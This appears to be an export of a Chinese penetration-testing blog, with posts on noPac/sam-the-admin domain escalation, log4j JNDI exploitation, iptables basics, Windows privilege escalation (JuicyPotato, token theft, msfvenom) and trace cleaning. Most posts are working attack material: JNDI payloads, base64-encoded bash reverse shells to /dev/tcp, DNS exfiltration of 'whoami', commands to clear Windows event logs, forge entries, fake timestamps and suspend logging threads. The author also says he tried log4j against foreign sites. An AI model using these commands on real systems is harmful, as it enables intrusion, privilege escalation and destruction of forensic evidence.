class="line">0iJPCoFLaTCSvlMmq3G5/4epI0gjwx6a6oeUTutxc8MfnHL2kAYxW7tgezuDxKVno4LZFVJWKbObrXctu2i16Dr7m5eLgyuKf5UQ41RiOUoTSLQUt4s2gq73/NG1MzwRmPq5Z+cWmXDzVual58Mm5W4fipIYqPg88Wnm+/WmxYi0ICQgxhJENaZQf3UM0fXKSjTzgVWHkFRfaGx4uaAqzn8MKs4FtCmSf+OVEf7QW0imtvDAsQNixLU8ZTF+OK6rZDs76GB43KUxlhPUTl7NE9kpzlwcef8HiRc4rSsc386/NeqsSDjZXgqYcAAQX7v0tNJ0lt+sRrg6GQT7YYHegOMQ9ywBgvdMVAFAzEPMnmW7GhHCOhubxHtDzAEDgkmpM0LXdE27m0acD6XyrRTPdf8slsKD1GliX5iW77L9+qqThwBmb9xRMFgNRFGJDE62g0SlY3+QY1IRpdAUqCuBHKctmeyWemDVBlJWbmqooHwBU3HwOxe8J+TPUevVBko4HDMIHAoAMCAQCigbgEgbV9gbIwga+ggawwgakwgaagGzAZoAMCARehEgQQHKpy33rwHG1c49Aha5Vzp6EJGwdMQUIuQ09NohEwD6ADAgEBoQgwBhsEREMwMaMHAwUAQOEAAKURGA8yMDIxMTIyMTA3MTEwN1qmERgPMjAyMTEyMjExNzExMDdapxEYDzIwMjExMjI4MDcxMTA3WqgJGwdMQUIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdsYWIuY29t</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><del>这里不管使用cmd 还是powershell  命令太长了被分成了两个……？？？</del></p>
<p>额 居然是在复制时候 太长notepad给自己换行了</p>
<p><img src="/posts/1fd95242/12.png" alt="截图"></p>
<br>

<h4 id="获取krbtgt用户的NTLM-Hash"><a href="#获取krbtgt用户的NTLM-Hash" class="headerlink" title="获取krbtgt用户的NTLM Hash"></a>获取krbtgt用户的NTLM Hash</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /user:lab\krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="/posts/1fd95242/13.png" alt="截图"></p>
<br>

<h4 id="清除票据"><a href="#清除票据" class="headerlink" title="清除票据"></a>清除票据</h4><p><code>klist purge</code></p>
<br>

<h3 id="noPac"><a href="#noPac" class="headerlink" title="noPac"></a>noPac</h3><p><a href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
<p><a href="https://github.com/waterrr/noPac?ref=pythonawesome.com">https://github.com/waterrr/noPac?ref=pythonawesome.com</a></p>
<p>在win2008下 提示需要 .Net4.0 结果安装失败了..</p>
<p>然后换win2012R2 的一台域机器去复现</p>
<p>0x01 扫描探测</p>
<p><code>noPac.exe -scan  -domain lab.com -user user01 -pass Test.123</code>  （这里密码加’’会报错）</p>
<p><img src="/posts/1fd95242/14.png" alt="截图"></p>
<p>复现失败，可用创建用户，但是再</p>
<p>然后尝试再这个普通域用户下去安装python 但是报错策略XX 失败  python安装也超时了 **@#￥@**@$@#</p>
<p> 去尝试安装。net4.5  还是超时了 这个域环境是别人给我的  真***烂，PTT,PTK,PTH都实验不了 机器网也问题很大 能访问bing 别的访问不了….</p>
<h4 id="踩完的后的利用。。。"><a href="#踩完的后的利用。。。" class="headerlink" title="踩完的后的利用。。。"></a>踩完的后的利用。。。</h4><h5 id="扫描探测"><a href="#扫描探测" class="headerlink" title="扫描探测"></a>扫描探测</h5><p><code>noPac.exe scan -domain lab.com -user user01 -pass Test.123</code>  这里密码处网上加的’’但是这里我加上就会报错 不加的话可正常使用</p>
<p><img src="/posts/1fd95242/15.png" alt="截图"></p>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p><code>./noPac.exe -domain attack.local -user oa -pass &#39;!@#Qz123&#39; /dc dc.attack.local /mAccount test123 /mPassword passW0rd /service cifs /ptt</code></p>
<p><code>ls  \\DC01.lab.com\C$ </code></p>
<p><img src="/posts/1fd95242/16.png" alt="截图"></p>
<br>

<p>还有个python版的noPac 但是这台机器上的python是离线安装的 pip还不知道怎么安 ┭┮﹏┭┮ 踩坑踩了一天终于能复现到了</p>
<br>

<h4 id="noPac（python）"><a href="#noPac（python）" class="headerlink" title="noPac（python）"></a>noPac（python）</h4><p> <a href="https://github.com/waterrr/noPac?ref=pythonawesome.com">https://github.com/waterrr/noPac?ref=pythonawesome.com</a></p>
<br>

<h4 id="Sam-the-admin"><a href="#Sam-the-admin" class="headerlink" title="Sam_the_admin"></a>Sam_the_admin</h4><p>CVE-2021-42287/CVE-2021-42278 Attack</p>
<p>Python 利用脚本：<a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
<p><code>python3 sam_the_admin.py &quot;redteam/saul:Red12345&quot; -dc-ip 10.10.10.8 -shell</code></p>
<p>这个还没尝试 <a href="https://heibai.org.cn/2071.html">https://heibai.org.cn/2071.html</a></p>
<br>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个洞复现踩了好多坑….用了一天的时间….</p>
<p>由于测试机器使用的域内普通用户，在下载、安装上都会受到限制，然后选择采取使用离线安装的方式去下载相关版本，只下载了免安装的.net 4.6和 py3.7 但是py3的pip还没整上去，后续的exp脚本就没有测试。</p>
<p>还有就是因为是在虚拟机上运行的，且是使用的域内普通用户，因此这个vmtools 无法直接从外面复制进来文件，而且在尝试直接使用python http服务去下载是 默认浏览器存在安全策略，而普通用户无法关闭，然后我去用administrator去关闭了IE安全策略后，还是存在安全策略，然后没法使用。只能通过在测试机器上去访问administrator目录下 从外面拖进来的所需要的文件</p>
]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>log4j_rce利用</title>
    <url>/posts/5bd4bc7e/</url>
    <content><![CDATA[<p>程序在使用日志读取用户输入时，攻击者可以构造恶意代码${}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://f03b65e6.dns.1433.eu.org./exp&#125;</span><br><span class="line"></span><br><span class="line">1.7</span><br><span class="line"></span><br><span class="line">$&#123;jndi:ldap://IP:1389/shzltp&#125;</span><br><span class="line">ldap://IP:1389/shzltp</span><br><span class="line"></span><br><span class="line">1.8</span><br><span class="line">$&#123;jndi:ldap://IP:1389/ojzxns&#125;</span><br><span class="line">ldap://IP:1389/ojzxns</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash转码&quot; -A  IP</span><br><span class="line"></span><br><span class="line">ping `whoami`.48f3ebc4.dns.1433.eu.org.</span><br><span class="line">bash -c &#123;echo,cGluZyBgd2hvYW1pYC5mMDNiNjVlNi5kbnMuMTQzMy5ldS5vcmcu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,cGluZyBgd2hvYW1pYC5mMDNiNjVlNi5kbnMuMTQzMy5ldS5vcmcu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A  IP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/IP/3344 0&gt;&amp;1</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS43Ni4yMjMuNTUvMzM0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS43Ni4yMjMuNTUvMzM0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;  -A  IP</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>感觉对于一些小型企业基本不会去使用这个东西，对于大型站点可能会去使用，但是往往他们的防护也及时，今天下午试了一些国外站点，基本上都不出网没法成功利用。。。</p>
]]></content>
      <categories>
        <category>log4j</category>
      </categories>
      <tags>
        <tag>log4j</tag>
      </tags>
  </entry>
  <entry>
    <title>iptables简单使用</title>
    <url>/posts/1d385bbc/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看现在iptables规则</span><br><span class="line">iptables -L -n -v</span><br><span class="line"></span><br><span class="line">#配置，禁止进，允许出，允许回环网卡</span><br><span class="line">iptables -P INPUT DROP</span><br><span class="line">iptables -A OUTPUT -j ACCEPT</span><br><span class="line">iptables -A INPUT -i lo -j ACCEPT</span><br><span class="line"></span><br><span class="line">#允许ping</span><br><span class="line">iptables -A INPUT -p icmp -j ACCEPT</span><br><span class="line"></span><br><span class="line">#允许ssh</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#允许ftp</span><br><span class="line">iptables -A INPUT -p tcp --dport 21 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 20 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#允许DNS</span><br><span class="line">iptables -A INPUT -p tcp -m tcp --dport 53 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p udp -m udp --dport 53 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#允许http和https</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 443 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#允许已建立的或相关连的通行</span><br><span class="line">iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line"></span><br><span class="line">#禁止其他未允许的规则访问</span><br><span class="line">iptables -A INPUT -j REJECT #（注意：如果22端口未加入允许规则，SSH链接会直接断开。）</span><br><span class="line">iptables -A FORWARD -j REJECT</span><br><span class="line"></span><br><span class="line">#屏蔽IP</span><br><span class="line">iptables -I INPUT -s 192.168.1.4 -j DROP       #屏蔽单个IP的命令</span><br><span class="line">iptables -I INPUT -s 123.0.0.0/8 -j DROP      #封整个段即从123.0.0.1到123.255.255.254</span><br><span class="line">iptables -I INPUT -s 192.168.0.0/16 -j DROP    #封IP段即从192.168.0.1到192.168.255.254</span><br><span class="line">iptables -I INPUT -s 192.168.1.0/24 -j DROP    #封IP段即从192.168.1.1到192.168.1.254</span><br><span class="line"></span><br><span class="line">#删除已添加的iptables规则  -D</span><br><span class="line">iptables -D INPUT -s 192.168.1.4 -j DROP</span><br><span class="line">iptables -D INPUT 3 #删除第三条</span><br><span class="line"></span><br><span class="line">#清除防火墙规则</span><br><span class="line">iptables -F	</span><br></pre></td></tr></table></figure>



<p>参考  <a href="https://www.cnblogs.com/hellxz/p/9688044.html">https://www.cnblogs.com/hellxz/p/9688044.html</a></p>
]]></content>
      <categories>
        <category>iptables</category>
      </categories>
      <tags>
        <tag>iptables</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows提权篇</title>
    <url>/posts/61d7ac81/</url>
    <content><![CDATA[<h3 id="Windows中的用户与组"><a href="#Windows中的用户与组" class="headerlink" title="Windows中的用户与组"></a>Windows中的用户与组</h3><p><img src="/posts/61d7ac81/1.png"></p>
<h3 id="Potato家族提权"><a href="#Potato家族提权" class="headerlink" title="Potato家族提权"></a>Potato家族提权</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>通过各种⽅法在本地NTLM中继获取SYSTEM令牌，再通过模拟令牌执⾏命令。</p>
<h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul>
<li>获取高权限令牌——token</li>
<li>SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege 权限</li>
</ul>
<blockquote>
<p>当⽤户具有 SeImpersonatePrivilege 特权，可以调⽤ CreateProcessWithTokenW 以某 个Token的权限启动新进程。 </p>
<p>当⽤户具有 SeAssignPrimaryTokenPrivilege 特权，可以调⽤ CreateProcessAsUserW 以指定⽤户权限启动新进程。</p>
</blockquote>
<p><em>Windows的token</em></p>
<ul>
<li>Delegation token(授权令牌):⽤于交互会话登录(例如本地⽤户直接登录、远程桌⾯登录) </li>
<li>Impersonation token(模拟令牌):⽤于⾮交互登录(利⽤net use访问共享⽂件夹</li>
</ul>
<p><em>Windows服务使用的登录账户</em></p>
<ul>
<li>NT AUTHORITY\System </li>
<li>NT AUTHORITY\Network Service </li>
<li>NT AUTHORITY\Local Service</li>
</ul>
<h4 id="Juicypotato-MS16-075"><a href="#Juicypotato-MS16-075" class="headerlink" title="Juicypotato(MS16-075)"></a>Juicypotato(MS16-075)</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>通过DCOM 来使服务向攻击者监听的端⼝发起连接并进⾏NTLM认证。</p>
<h5 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h5><ul>
<li>1.开启SeImpersonate或者SeAssignPrimaryToken权限</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /all</span><br><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>

<p><img src="/posts/61d7ac81/2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</span><br><span class="line">如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</span><br><span class="line">如果均开启，可以选择-t *</span><br><span class="line">如果均未开启，那么无法提权</span><br></pre></td></tr></table></figure>

<ul>
<li>2.查看RPC默认端口是否为135</li>
</ul>
<p><code>netsh advfirewall firewall add rule name=&quot;135&quot; protocol=TCP dir=in localport=135 action=allow</code></p>
<p><img src="/posts/61d7ac81/5.png"></p>
<ul>
<li>3.根据操作系统选择可用的CLSID</li>
</ul>
<p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p>
<p><img src="/posts/61d7ac81/3.png"></p>
<p><img src="/posts/61d7ac81/4.png"></p>
<ul>
<li>4.选择一个系统未占用的端口作为监听端口</li>
</ul>
<p> <code>-l</code> 指定监听端口</p>
<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><ul>
<li>1.Juicy_potato（原版）</li>
</ul>
<p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c &#123;03ca98d6-ff5d-49b8-abc6-03dd84127020&#125;</span><br><span class="line"></span><br><span class="line">Mandatory args:</span><br><span class="line">-t createprocess调用: &lt;t&gt; CreateProcessWithTokenW, &lt;u&gt; CreateProcessAsUser, &lt;*&gt; try both</span><br><span class="line">-p &lt;program&gt;: 运行指定程序</span><br><span class="line">-l &lt;port&gt;: COM服务器侦听端口</span><br><span class="line"></span><br><span class="line">Optional args:</span><br><span class="line">-m &lt;ip&gt;: COM服务器侦听地址 (默认 127.0.0.1)</span><br><span class="line">-a &lt;argument&gt;: 传递给程序命令行参数 (默认 NULL)</span><br><span class="line">-k &lt;ip&gt;: RPC服务器IP地址 (默认 127.0.0.1)</span><br><span class="line">-n &lt;port&gt;: RPC服务器侦听端口 (默认 135)</span><br><span class="line">-c &lt;&#123;clsid&#125;&gt;: CLSID (default BITS:&#123;4991d34b-80a1-4291-83b6-3328366b9097&#125;)</span><br><span class="line">https://github.com/ohpe/juicy-potato/tree/master/CLSID</span><br><span class="line">-z 仅测试CLSID并打印令牌的用户</span><br></pre></td></tr></table></figure>

<p><img src="/posts/61d7ac81/6.png"></p>
<p>然后会弹出一个cmd <code>whoami</code> 查看为system权限</p>
<p><img src="/posts/61d7ac81/7.png"></p>
<ul>
<li>2.JuicyPotatoWeb(改)</li>
</ul>
<p><img src="/posts/61d7ac81/8.png"></p>
<p><code>JuicyPotatowweb.exe -p whoami</code></p>
<p>如果CLSID默认的不行 可以换别的试试</p>
<p><img src="/posts/61d7ac81/9.png"></p>
<h5 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h5><ul>
<li>1.阻止攻击者获得SeImpersonate或者SeAssignPrimaryToken权限</li>
<li> 2.即使打好系统补丁</li>
<li> 3.升级到最新的windows系统</li>
</ul>
<h4 id="BadPotato"><a href="#BadPotato" class="headerlink" title="BadPotato"></a>BadPotato</h4><p><a href="https://github.com/hifuck/badpotato">https://github.com/hifuck/badpotato</a></p>
<h5 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h5><p><code>BadPotato.exe whoami</code></p>
<p><img src="/posts/61d7ac81/10.png"></p>
<h4 id="RoguePotato"><a href="#RoguePotato" class="headerlink" title="RoguePotato"></a>RoguePotato</h4><p>后续再补充~</p>
<h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><h4 id="incognito-exe"><a href="#incognito-exe" class="headerlink" title="incognito.exe"></a>incognito.exe</h4><p>下载地址 <a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#列取token</span><br><span class="line">incognito.exe list_tokens -u</span><br><span class="line">#远程列举token</span><br><span class="line">incognito.exe -h 192.168.0.159 -u pte1 -p &quot;Pte1.123&quot;  list_tokens -u</span><br><span class="line">#窃取到system权限</span><br><span class="line">incognito.exe  execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe</span><br><span class="line">#降权至当前用户</span><br><span class="line">incognito.exe execute -c &quot;pte1-PC\pte1&quot; cmd.exe</span><br><span class="line">#远程窃取到system权限</span><br><span class="line">incognito.exe -h 192.168.0.159 -u pte1 -p &quot;Pte1.123&quot; execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/posts/61d7ac81/11.png"></p>
<p><img src="/posts/61d7ac81/12.png"></p>
<p>ctrl+c 退出就能恢复原权限</p>
<h4 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用msf</h4><ul>
<li>1.生产shell</li>
</ul>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=198.168.0.133 LPORT=3344 -f exe -o  shell.exe</code>  (弹shell也可以使用nishang 的 ps1脚本但是要求ps版本在3以上)</p>
<p><img src="/posts/61d7ac81/13.png"></p>
<ul>
<li>2.使用msf内置模块 incognito</li>
</ul>
<p><img src="/posts/61d7ac81/14.png"></p>
<ul>
<li>3.窃取token</li>
</ul>
<p><code>impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</code> #窃取SYSTEM权限</p>
<p><code>steal_token 1252</code> 从进程中窃取</p>
<p><img src="/posts/61d7ac81/15.png"></p>
<ul>
<li>4.恢复到之前的权限</li>
</ul>
<p><code>rev2self</code></p>
<p><img src="/posts/61d7ac81/16.png"></p>
<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><h4 id="MS15-051"><a href="#MS15-051" class="headerlink" title="MS15-051"></a>MS15-051</h4><h4 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h4><h4 id="MS14-058"><a href="#MS14-058" class="headerlink" title="MS14-058"></a>MS14-058</h4><br>

<h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="Mysql-UDF提权"><a href="#Mysql-UDF提权" class="headerlink" title="Mysql UDF提权"></a>Mysql UDF提权</h4><h5 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h5><ul>
<li>必须是root权限</li>
<li>secure_file_priv= </li>
<li>将udf.dll 文件上传到Mysql的plugins目录下</li>
</ul>
<p>具体可以参考<a href="https://blog.csdn.net/qq_36119192/article/details/84863268">https://blog.csdn.net/qq_36119192/article/details/84863268</a></p>
<p>也可以使用udf大马</p>
]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>痕迹清理-Windows篇-01</title>
    <url>/posts/d8f69548/</url>
    <content><![CDATA[<h3 id="清理时间痕迹"><a href="#清理时间痕迹" class="headerlink" title="清理时间痕迹"></a>清理时间痕迹</h3><h4 id="伪造文件修改时间"><a href="#伪造文件修改时间" class="headerlink" title="伪造文件修改时间"></a>伪造文件修改时间</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">edit_time</span><span class="params">(<span class="variable">$path</span>)</span></span>&#123;<span class="variable">$date1</span> =<span class="built_in">Get-ChildItem</span> |</span><br><span class="line"><span class="built_in">Select</span> LastWriteTime|<span class="built_in">Get-Random</span>;<span class="variable">$date2</span> =<span class="built_in">Get-ChildItem</span> |</span><br><span class="line"><span class="built_in">Select</span> LastWriteTime|<span class="built_in">Get-Random</span>;<span class="variable">$date3</span> =<span class="built_in">Get-ChildItem</span> |</span><br><span class="line"><span class="built_in">Select</span> LastWriteTime|<span class="built_in">Get-Random</span>;<span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$path</span>).lastaccesstime=<span class="variable">$date1</span>.LastWriteTime;</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$path</span>).creationtime=<span class="variable">$date2</span>.LastWriteTime ;</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$path</span>).lastwritetime=<span class="variable">$date3</span>.LastWriteTime&#125;;</span><br><span class="line">edit_time(<span class="string">&quot;D:\test&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="伪造日志时间"><a href="#伪造日志时间" class="headerlink" title="伪造日志时间"></a>伪造日志时间</h4><p>使用eventcreate 详见下。</p>
<h3 id="清理用户痕迹"><a href="#清理用户痕迹" class="headerlink" title="清理用户痕迹"></a>清理用户痕迹</h3><h4 id="清理3389痕迹"><a href="#清理3389痕迹" class="headerlink" title="清理3389痕迹"></a>清理3389痕迹</h4><h3 id="清理操作痕迹"><a href="#清理操作痕迹" class="headerlink" title="清理操作痕迹"></a>清理操作痕迹</h3><h4 id="日志相关知识"><a href="#日志相关知识" class="headerlink" title="日志相关知识"></a>日志相关知识</h4><h5 id="产生流程"><a href="#产生流程" class="headerlink" title="产生流程"></a>产生流程</h5><ul>
<li><code>svchost.exe</code>（svchost.exe有些专门记录用于记录日志的线程启动日志记录功能）</li>
<li><code>内存堆</code>（记录的操作会缓存为一段内存内容）</li>
<li><code>wevtutil.exe</code>（将内存内容通过wevtutil.exe解析为xml文档）</li>
<li><code>日志</code>（将xml转换为可读的日志）</li>
</ul>
<h5 id="日志类型"><a href="#日志类型" class="headerlink" title="日志类型"></a>日志类型</h5><h6 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h6><p>位置 : <code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></p>
<p>安全相关的事件，如 用户权限变更登录、注销，文件/文件夹访问</p>
<h6 id="System"><a href="#System" class="headerlink" title="System"></a>System</h6><p>位置: <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></p>
<p>系统进程、设备、磁盘活动等</p>
<h6 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h6><p>位置: <code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></p>
<p>包含操作系统安装的应用程序软件相关的事件</p>
<h6 id="应用程序及服务日志"><a href="#应用程序及服务日志" class="headerlink" title="应用程序及服务日志"></a>应用程序及服务日志</h6><p>远程桌面客户端连接、无线网络、有线网路、设备安装等相关日志。</p>
<h5 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h5><p><code>eventvwr</code></p>
<h5 id="伪造日志"><a href="#伪造日志" class="headerlink" title="伪造日志"></a>伪造日志</h5><p><code>eventcreate</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eventcreate -l system -so administrator -t warning -d &quot;this is a test&quot; -id 500</span><br><span class="line"></span><br><span class="line">-t  warning / error / information / success</span><br><span class="line">-id  1-1000</span><br><span class="line">-so 可以自定义  来源</span><br><span class="line">具体语法如下</span><br><span class="line">eventcreate [/s Computer [/u Domain\User [/p Password]] &#123;[/l &#123;APPLICATION|SYSTEM&#125;]|[/so SrcName]&#125; /t &#123;ERROR|WARNING|INFORMATION|SUCCESSAUDIT|FAILUREAUDIT&#125; /id EventID /d Description</span><br><span class="line"></span><br><span class="line">使用</span><br><span class="line">eventcreate -l system(日志类型) -so administrator（谁生成的） -t warning（等级） -d &quot;this is a test&quot;（日志内容） -id 500（id号）</span><br></pre></td></tr></table></figure>



<h4 id="日志清理"><a href="#日志清理" class="headerlink" title="日志清理"></a>日志清理</h4><ul>
<li>1.查看事件查看器—-手动清理</li>
<li>2.cmd命令删除日志</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wevtutil el 列出系统中所有日志名称</span><br><span class="line">wevtutil cl system 清理系统日志</span><br><span class="line">wevtutil cl application 清理应用程序日志</span><br><span class="line">wevtutil cl security 清理安全日志</span><br></pre></td></tr></table></figure>

<p>凡是操作都会留下痕迹，哪怕是删除日志，也会留下一条删除日志的日志</p>
<ul>
<li>3.powershell命令删除</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PowerShell -Command &quot;&amp; &#123;Clear-Eventlog -Log Application,System,Security&#125;&quot;</span><br><span class="line"></span><br><span class="line"># 下面这个在powershell下运行 需要.net版本3.5</span><br><span class="line">Get-WinEvent -ListLog Application,Setup,Security -Force | % &#123;Wevtutil.exe cl $_.Logname&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>4.msf删除日志</li>
</ul>
<p><code>meterpreter &gt; clearev</code></p>
<ul>
<li>5.单条日志的清理</li>
</ul>
<p>见下篇，主要参考三好学生大佬的文章[<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4]">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4]</a>~</p>
<h4 id="停止记录日志"><a href="#停止记录日志" class="headerlink" title="停止记录日志"></a>停止记录日志</h4><h5 id="基于powershell"><a href="#基于powershell" class="headerlink" title="基于powershell"></a>基于powershell</h5><p>项目地址 <a href="https://github.com/hlldz/Phant0m">https://github.com/hlldz/Phant0m</a>  会直接杀掉线程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#修改powershell权限</span><br><span class="line">Get-ExecutionPolicy</span><br><span class="line">Set-ExecutionPolicy unrestricted</span><br><span class="line"></span><br><span class="line">Import-Module .\Invoke-Phant0m.ps1</span><br><span class="line">Invoke-Phant0m</span><br><span class="line">#效果一般</span><br></pre></td></tr></table></figure>



<h5 id="基于C"><a href="#基于C" class="headerlink" title="基于C"></a>基于C</h5><p>项目地址 <a href="https://github.com/QAX-A-Team/EventCleaner">https://github.com/QAX-A-Team/EventCleaner</a> 相比上面 这个可以暂停日志记录线程 也可以恢复线程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#暂停线程</span><br><span class="line">EventCleaner suspend</span><br><span class="line">#恢复线程</span><br><span class="line">EventCleaner normal</span><br></pre></td></tr></table></figure>







<h4 id="文件的覆写删除"><a href="#文件的覆写删除" class="headerlink" title="文件的覆写删除"></a>文件的覆写删除</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cipher /W:D:\test 	</span><br><span class="line">#会对删除文件后留下的空间进行3此覆盖操作 先写入0x00 再写入0xFF 最后写入随意数字</span><br><span class="line"></span><br><span class="line">format G:/P：4</span><br><span class="line">#对G盘数据进行格式化处理后进行4次覆写</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>痕迹清理</category>
      </categories>
      <tags>
        <tag>痕迹清理</tag>
      </tags>
  </entry>
  <entry>
    <title>痕迹清理-Linux篇</title>
    <url>/posts/1b08230/</url>
    <content><![CDATA[<h3 id="登录痕迹清理"><a href="#登录痕迹清理" class="headerlink" title="登录痕迹清理"></a>登录痕迹清理</h3><h4 id="基本的日志结构"><a href="#基本的日志结构" class="headerlink" title="基本的日志结构"></a>基本的日志结构</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/btmp 记录所有登录失败信息，使用lastb命令查看</span><br><span class="line">/var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看</span><br><span class="line">/var/log/wtmp 记录所有用户的登录、注销信息，使用last命令查看</span><br><span class="line">/var/log/utmp 记录当前已经登录的用户信息，使用w,who,users等命令查看</span><br><span class="line">/var/log/secure 记录与安全相关的日志信息</span><br><span class="line">/var/log/message 记录系统启动后的信息和错误日志</span><br></pre></td></tr></table></figure>

